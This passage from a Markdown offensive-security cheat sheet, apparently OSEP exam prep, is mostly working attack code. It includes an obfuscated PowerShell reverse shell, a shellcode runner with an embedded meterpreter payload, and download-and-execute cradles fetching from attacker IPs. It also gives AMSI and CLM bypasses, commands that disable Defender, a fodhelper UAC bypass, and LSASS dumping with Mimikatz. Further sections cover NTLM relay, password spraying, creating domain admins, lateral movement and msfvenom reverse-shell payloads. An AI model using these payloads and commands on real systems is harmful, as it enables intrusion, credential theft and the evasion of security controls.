            ${/==\/====\___/\_/}.Write(${___/==\__/\___/==},0,${___/==\__/\___/==}.Length)
            ${/==\/====\___/\_/}.Flush()  
        }
        ${/=\___/\__/\___/=}.Close()
        if (${_/===\___/=====\_})
        {
            ${_/===\___/=====\_}.Stop()
        }
    }
    catch
    {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACEAIABDAGgAZQBjAGsAIABpAGYAIAB0AGgAZQAgAHMAZQByAHYAZQByACAAaQBzACAAcgBlAGEAYwBoAGEAYgBsAGUAIABhAG4AZAAgAHkAbwB1ACAAYQByAGUAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAGMAbwByAHIAZQBjAHQAIABwAG8AcgB0AC4A'))) 
        Write-Error $_
    }
}
_/=\/==\_/==\_____ -__/\/\/=\_/\/\____ -__/==\/=\_/==\/==\ 172.21.23.2 -__/====\/\___/=\/\ 80
```
<br>

### Powershell_Meterpreter

- A even better shell
- Rev meterpreter shell with powershell, just replace shellcode


```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
$functionName))
}
function getDelegateType {
        Param ( 
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, 
            [Parameter(Position = 1)] [Type] $delType = [Void]
    ) 
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) 
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed') 
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed') 
    return $type.CreateType() 
} 
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
#msfvenom -f ps1 
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0x41,0x51,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0x8b,0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x41,0x58,0x48,0x1,0xd0,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xd,0x0,0x0,0x0,0x31,0x37,0x32,0x2e,0x32,0x31,0x2e,0x32,0x33,0x2e,0x31,0x30,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x90,0x1f,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x7b,0x0,0x0,0x0,0x2f,0x6b,0x76,0x51,0x45,0x70,0x45,0x49,0x65,0x42,0x34,0x33,0x33,0x5a,0x50,0x5a,0x6d,0x6c,0x53,0x69,0x56,0x4e,0x51,0x6f,0x37,0x67,0x76,0x6f,0x72,0x54,0x5f,0x6a,0x51,0x45,0x71,0x72,0x33,0x65,0x58,0x48,0x64,0x44,0x5f,0x50,0x68,0x59,0x66,0x35,0x6a,0x77,0x51,0x6a,0x38,0x4e,0x72,0x47,0x4e,0x37,0x62,0x5f,0x59,0x44,0x76,0x52,0x56,0x45,0x52,0x6c,0x56,0x38,0x48,0x36,0x49,0x64,0x45,0x52,0x51,0x7a,0x52,0x37,0x65,0x43,0x52,0x56,0x34,0x50,0x6a,0x6a,0x62,0x36,0x49,0x6b,0x32,0x4c,0x52,0x4c,0x32,0x36,0x5f,0x61,0x77,0x70,0x74,0x66,0x6e,0x34,0x74,0x67,0x73,0x6b,0x37,0x72,0x7a,0x7a,0x7a,0x39,0x51,0x4b,0x65,0x75,0x4d,0x49,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length) 
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero) 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

## Bringing it home
-  Save the below string to a file as .bat and execute.

```powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/ps.txt')"
```
<br>

## Download_file
```powershell
(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
```
<br>

## Change user pw remotely
```

$remote = New-Object System.Management.Automation.PSCredential (“DOMAIN\USER”, (ConvertTo-SecureString “PASSWORD” -AsPlainText -Force)) 
$creds = ConvertTo-SecureString 'PasswordRulon123!' -AsPlainText -Force 
Set-DomainUserPassword -Identity USER -AccountPassword $creds -Credential $remote -Verbose 
```
<br>

## Download files

```
powershell.exe iwr -uri http://IP/nc64.exe -o c:\windows\tasks\nc64.exe 
powershell.exe wget http://IP/ -out C:\file
```
<br>

## Execute cmd Remotely
```
Invoke-Command  -ScriptBlock {cmd /c powershell C:\Users\public\rev.ps1} -Session $sess
```
<br>

## New_Session
```powershell
$sess = New-PSSession -ComputerName <Name>
```
<br>

## Copy_to_session
```powershell
Copy-Item -Path C:\Users\public\rev.ps1 -Destination 'C:\Users\public\rev.ps1' -ToSession $sess
```
<br>
 
## Powershell_Cradle
```powershell
iex(new-object net.webclient).downloadstring('http://192.168.49.68/<ToolName>.ps1')
```

<br>

## Unquoted paths via powerup
```
Write-ServiceBinary -Name 'unquotedsvc' -Path 'C:\Program Files\Unquoted Path Service\Common.exe' -Username badmin1 -Password p4ssw0rd123 -Verbose

net start unquotedsvc

```
<br>

## Service Permissions via powerup
```
Invoke-ServiceAbuse -Name 'daclsvc' -Username badmin3 -Password p4ssword123

net start daclsvc
```
<br>


### Constrained_lang_mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```
<br>

### CLM_Bypass

- [CLM-BYPASS](https://github.com/calebstewart/bypass-clm)

```
Certutil -encode osep-clm.exe enc5.txt 
```
<br>

```
<head> 
<script language="JScript"> 
var shell = new ActiveXObject("WScript.Shell"); 
var res = shell.Run("powershell iwr -uri http://IP/enc5.txt -outfile C:\\Windows\\Tasks\\enc7.txt;powershell certutil -decode C:\\Windows\\Tasks\\enc7.txt C:\\Windows\\Tasks\\execute.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\execute.exe"); 
</script> 
</head> 
<body> 
<script language="JScript"> 
self.close(); 
</script> 
</body> 
</html> 
```
<br>
or
<br>

```powershell
Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\bypass-clm.exe"
```
<br>


## Disable_AMSI
 
 ### Method 1:
```powershell
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
```
<br>

### Method 2:
```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```
<br>

### Method 3:
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);

```
<br>
<br>

## Load_assembly_reflectively

### Download and run assembly without arguments
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()
```
<br>

### Download and run Rubeus, with arguments (make sure to split the args)
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```
<br>

### Execute a specific method from an assembly (e.g. a DLL)
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```
<br>

# Lateral_Movement

<br>

## Fileless_Movement


- [lateralmovement](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Fileless%20Lateral%20Movement)
```
- copy .\payload.exe \\server\share$\windows\tasks
or
- $sess = New-PSSession -ComputerName <Name>
- Copy-item -path C:\users\puublic\payload.ps1 -destination 'C:\users\public\payload.ps1' -tosession $sess
```
<br>

```
latmov.exe <server> senorservice "c:\windows\tasks\payload.exe"
or
proxychains python scshell.py -service-name Sensorservice DOMAIN/USERNAME:PASSWORD@ComputerIP
proxychains python scshell.py -service-name Sensorservice DOMAIN/USERNAME@ComputerIP -hashes 00000000000000000000000000000000:aec2214937bedcfa722c4123ca859423
```

<br>


## SSH

### Local Port Forwarding:
```bash
ssh user@KillaOcean -L 127.0.0.1:5577:127.0.0.1:5577
```
<br>

## Remote Port Forwarding:

```bash
ssh user@KillaOcean -R 127.0.0.1:5577:127.0.0.1:22
```
<br>



## Dynamic Port Forwarding:
```bash
ssh -NfD 1080 user@KillaOcean
proxychains4 nmap 192.168.1.0/24
```
<br>

### autorun

```
post/multi/manage/autoroute
set session x
run

auxiliary/server/socks_proxy
```
<br>

# Pivoting

- [Pivoting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)

<br>

## Chisel

## Port Forwarding

#### Attacker Machine:
```powershell
chisel server -p 6666 --reverse
```

#### Victim Machine:
```powershell
chisel client attackerip:6666 R:2222:127.0.0.1:3306/tcp
```

<br>

## SOCKS Proxy

#### Attacker Machine:
```powershell
chisel server -p 6666 --socks5 --reverse
```

#### Victim Machine:
```powershell
chisel client attackerip:6666 R:5000:socks
```

<br>

## Bloodhound

```powershell
# run the collector on the machine using SharpHound.exe
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
.\SharpHound.exe -c all -d active.htb -SearchForest
.\SharpHound.exe --EncryptZip --ZipFilename export.zip
.\SharpHound.exe -c all,GPOLocalGroup
.\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
.\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23
.\SharpHound.exe -c all,GPOLocalGroup --searchforest

# or run the collector on the machine using Powershell
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>

# or remotely via BloodHound Python
# https://github.com/fox-it/BloodHound.py
pip install bloodhound
bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
```

<br>
<br>

# Active_Directory

[Cheatsheet 1](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)

[Cheatsheet 2](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)

[Cheatsheet 3](https://book.hacktricks.xyz/windows/active-directory-methodology)

[Cheatsheet 4](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

<br>

## NTLMRELAY

*Signing must be disabled 
*Cannot execute this Against Self
```
cme smb — gen-relay-list smb_targets.txt 172.21.23.0/24
Responder -rdP -I eth0
Ntlmrelayx.py -tf targets.txt -e payload.exe
```

<br>

## Password Spraying
```
cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18
cme smb 192.168.1.101 -u user1 -p password1 password2 password3
```

<br>

## APPLOCKER ENUMERATION
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
```

<br>

## LAPS
```
iex(New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1') 
Get-ADObject -Name MachineName -DomainController IP -Properties ms-mcs-admpwd 
```

<br>

# Windows

<br>

## RollBack Defender
```
 “C:\Program Files\Windows Defender\MpCmdRun.exe” -removedefinitions -all
 
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f

REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f

```

<br>
<br>

## Create and Add user to DA group
```
net user John Password123! /add /domain 
net localgroup "Remote Desktop Users" John /add /domain 
net group "domain admins" John /add /domain 
```

<br>
<br>

## Disable_Restricted_Admin
*RDP

```
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin  -Value 0
xfreerdp /u:admin /pth:HASH /v:<IP> /cert-ignore
```


<br>
<br>

## Writeable_paths

```powershell
accesschk.exe "currentuser" C:\Windows -wus
```

<br>
<br>

## Run Dlls
```
Rundll32 c:\users\public\payload.dll,run
```

<br>
<br>



## Alternate_Data_Stream_Execution

```powershell
1. Identify file that is both writeable and executable by your user using icacls.exe
2. Type test.js > “C:\windows\somefile.log:test.js”
3. Verify - dir /r “C:\windows\somefile.log”
4. wscript “C:\windows\somefile.log:test.js”
```

<br>
<br>

## Fodhelper

```
1. Copy the code below and edit for your payload/create powershell script
2. Execute 'iex(new-object net.webclient).downloadstring('http://172.21.23.10/CodeBelow.ps1')
3. Might need to run twice and then execute the function 'Bypassuac'
4. Check Listener and verify 'whoami /groups'. Your looking for 'High mandatory level'
```

<br>
<br>

```powershell
function tryme { 
    $cmd = "powershell.exe iex(new-object net.webclient).downloadstring('http://172.21.23.10/metrunner.ps1')"
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue 
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force 
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force 
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
} 
function Bypassuac { 
    Start-Process "C:\Windows\System32\fodhelper.exe" -windowstyle hidden
    Start-Sleep -s 5
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue 
} 
tryme
```

<br>
<br>

## PPLKiller
```
1. upload the driver RTCore64.sys
2. upload PPLKiller.exe
3. PPLKiller.exe /installDriver
4. PPLKiller.exe /disableLSAProtection
*This is not work on a medium mandatory level ref to fodhelper section to obtain a high level. Verify this by 'whoami /groups'
```

<br>
<br>

# Mimikatz

<br>

## Metasploit Kiwi
```
1. While in meterpreter 'load kiwi'
2. creds_all
*Need system priv, Can be done using 'printspoofer.exe -i -c powershell.exe'....impersonate has to be enabled.
```

<br>

## Disable_LSA_and_Dump
```powershell
1. +!
2. !processprotect /process:lsass.exe /remove
3. sekurlsa::logonpasswords
```

<br>

## Offline_Dump
```powershell
1. sekurlsa::minidump lsass.dmp
2. sekurlsa::logonpasswords
```

<br>

## Minidump
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
namespace MiniDump
{
class Program
{
[DllImport("Dbghelp.dll")]
static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
IntPtr hFile, int DumpType, IntPtr ExceptionParam,
IntPtr UserStreamParam, IntPtr CallbackParam);
[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
int processId);
static void Main(string[] args)
{
FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp",
FileMode.Create);
Process[] lsass = Process.GetProcessesByName("lsass");
int lsass_pid = lsass[0].Id;
IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
bool dumped = MiniDumpWriteDump(handle, lsass_pid,
dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero,
IntPtr.Zero);
```
<br>

- [Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)

<br>


### Windows_Privilege_Escalation

- [Windows_Privilege_Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

<br>

### Windows_Download_Execute

- [Windows_Download_Execute](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)

<br>

### Windows_With_Creds

- [Windows_With_Creds](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md)

<br>

# Linux

## Linux_Privilege_Escalation

<br>

- [Linux_Privilege_Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

 <br>
 
### Full TTY
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ^Z
 stty raw -echo && fg
 reset
 ```
<br>


# Impacket 
[Cheatsheet 1](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/)

[Cheatsheet 2](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

[Cheatsheet 3](https://www.puckiestyle.nl/impacket/)

<br>


# TortugaToolKit
<br>

### Load DLL Remote:

```powershell
$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolkit.dll -UseBasicParsing).Content);
Import-Module -Assembly $a
```

<br>

### Load DLL local:

```powershell
$a=[System.Reflection.Assembly]::Load($(C:\Path\To\DLL); import-module -assembly $a
```

<br>

### Remote load&encrypt&processhollow:

```powershell
$code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
INVPH -encsh $code.encryptedShellcode -k $code.encryptionKey -ivk $code.initVectorKey -pn 'svchost.exe' -Verbose
```

<br>

### Impersonating process token&processhollow:

```powershell
$code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
```

<br>

```powershell
Invoke-ImpersonateProcessHollow -processId 1092 -exe "svchost.exe" -decryptKey $code.encryptionKey -shellCode $code.encryptedShellcode -initVector $code.initVectorKey
```

<br>

- ### Disable AMSI:

```
Disable-AyEmEsEye -verbose
```
<br>

- ### Disable Defender:

```
Disable-DefenderForEndpoint
```

<br>

- ### Cmdlets

```powershell
Disable-AyEmEsEye
Disable-DefenderForEndpoint
Disable-Etw
Enable-DefenderForEndpoint
Enable-Privileges
Get-ActiveDirectoryComputers
Get-ActiveDirectoryForests
Get-ActiveDirectoryGroupMembership
Get-ActiveDirectoryGroups
Get-ActiveDirectoryUsers
Get-CurrentIdentity
Get-MsSQLQuery
Get-SQLInfo
Get-System
Get-TrustedInstaller
Invoke-UnhookDll
Invoke-AdminCheck
Invoke-AssemblyLoader
Invoke-ClassicInjection
Invoke-FileLessLateralMovement
Invoke-LsaSecretsDmp
Invoke-MsSQLAssembly
Invoke-MsSQLShell
Invoke-PingSweep
Invoke-ProcessHollow
Invoke-ShellcodeEncryption
Invoke-TokenStealer
Invoke-TurtleDump
Invoke-TurtleHound
Invoke-TurtleUp
Invoke-TurtleView
Invoke-ImpersonateProcessHollow
Invoke-ImpersonateToken
Show-AvailableTokens
Undo-Impersonation
```
<br>

# PowerUpSQL


[Cheatsheet 1](https://github.com/tacom6/PowerUpSQL/blob/master/PowerUpSQL-CheatSheet.md)

[Cheatsheet 2](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

[Cheatsheet 3](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

<br>
<br>

# Rubeus

[Cheatsheet 1](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

[Cheatsheet 2](https://github.com/GhostPack/Rubeus)

[Cheatsheet 3](https://www.puckiestyle.nl/kerberos-cheatsheet/)

<br>
<br>

# Metasploit


### Msfvenom:
```
sudo msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.x.x lport=8080 EXITFUNC=thread -f csharp
```

<br>

```
sudo msfconsole -qx "use exploit/multi/handler ;set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
```

<br>

```
sudo msfconsole -qx "use exploit/multi/handler ;set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
```

<br>

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
```

<br>

```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f elf -o lin-4444
```

<br>

```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
```

<br>

```
msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f elf -o lin-4444
```

<br>

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.21.23.10 LPORT=443 EXITFUNC=thread -f ps1
```

 <br>
 
```
msfvenom -p windows/x64/meterpreter/reverse_https prependmigrateprocess=explorer.exe prependmigrate-true LHOST=172.21.23.10 LPORT=443 EXITFUNC=thread -f ps1
```

<br>

```
msfvenom -p windows/x64/meterpreter/reverse_tcp prependmigrateprocess=explorer.exe prependmigrate-true LHOST=172.21.23.2 LPORT=443 -f csharp
```


### Metasploit_Refs

- [Metasploit_Refs](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md)

<br>

# Tools

[SharpKatz](https://github.com/b4rtik/SharpKatz)

[SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)

[GhostPack](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

[SharpSploitConsole](https://github.com/anthemtotheego/SharpSploitConsole)

[SeatBelt](https://github.com/GhostPack/Seatbelt)

[Winpwn](https://github.com/S3cur3Th1sSh1t/WinPwn)

[SCShell](https://github.com/Mr-Un1k0d3r/SCShell)

[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)

[SharpImpersonation](https://github.com/S3cur3Th1sSh1t/SharpImpersonation)

[SharpCradle](https://github.com/anthemtotheego/SharpCradle)

[SharpMove](https://github.com/0xthirteen/SharpMove)

[Chameleon](https://github.com/klezVirus/chameleon)

[DotNetToJScript](https://github.com/tyranid/DotNetToJScript)

[ISESteroids](https://powershell.one/isesteroids/quickstart/install)

[Nishang](https://github.com/samratashok/nishang)

[PPLKiller](https://github.com/Mattiwatti/PPLKiller)

[Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)

[Neo-ConfuserEX](https://github.com/XenocodeRCE/neo-ConfuserEx)

[Bypass-CLM](https://github.com/calebstewart/bypass-clm)

[BloodHound](https://github.com/BloodHoundAD/BloodHound)

[LAPSToolKit](https://github.com/leoloobeek/LAPSToolkit)

[PSPY](https://github.com/DominicBreuker/pspy)

[LSE](https://github.com/diego-treitos/linux-smart-enumeration)

[HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)

[Chisel](https://github.com/jpillora/chisel)

[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

[DAMP](https://github.com/HarmJ0y/DAMP)

[SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC)

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

[PrintNightmare](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)

[SpoolSample](https://github.com/leechristensen/SpoolSample)

[Impacket](https://github.com/SecureAuthCorp/impacket)

